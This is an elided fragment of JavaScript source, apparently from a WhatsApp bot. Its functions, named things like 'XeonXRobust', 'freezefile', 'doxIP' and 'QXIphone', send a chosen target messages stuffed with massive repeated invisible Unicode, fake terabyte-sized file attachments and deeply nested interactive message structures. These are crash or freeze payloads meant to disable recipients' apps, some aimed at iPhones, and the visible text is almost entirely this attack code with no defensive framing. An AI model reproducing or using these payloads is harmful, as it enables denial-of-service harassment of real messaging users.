...
//function bug
  ...
  async function f10(target, Ptcp = false) {
    await cella.relayMessage(target, {
      extendedTextMessage: {
        text: "` ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉".repeat(7500),
        contextInfo: {
...
async function XeonXRobust(target, Ptcp = true) {
  const jids = `_*~@0~*_`.repeat(31250);
  const ui = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(1000);
  await cella.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "♨️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ♨️" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(6666)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                    ...
                    footer: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(100)
                }
            }
        }
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(6666) 
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
...
async function bugDocu(target) {
  try {
    ...
    const file = {
      ...
      size: 10995116627, // 1TB
      data: "1".repeat(199511075),
    };
    const message = {
      text: pesan,
...
async function doxIP(target) {
  try {
    const pesan = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(6000);
    const file = {
      name: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(5500) + ".txt",
      size: 109951162, // 1TB
...
async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "Wanna With Yours :D " + "ြ".repeat(290000);
    await cella.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
					...
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								...
								body: {
									text: "\u0000" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(6555),
								},
								nativeFlowMessage: {
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Wanna With Yours. :D" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(6555)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
...
async function newsLetter(target, Ptcp = true) {
                    ...
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                ...
                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(3334),
                                jpegThumbnail: "",
                                caption: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(3334),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
    ...
    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(37000);
      await cella.relayMessage(
        target,
        {
          locationMessage: {
    ...
    async function QDIphone(target) {
      cella.relayMessage(
        ...
        {
          extendedTextMessage: {
            text: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(3333),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
        ...
        target,
        {
          extendedTextMessage: {
            ...
            contextInfo: {
              ...
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(50000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
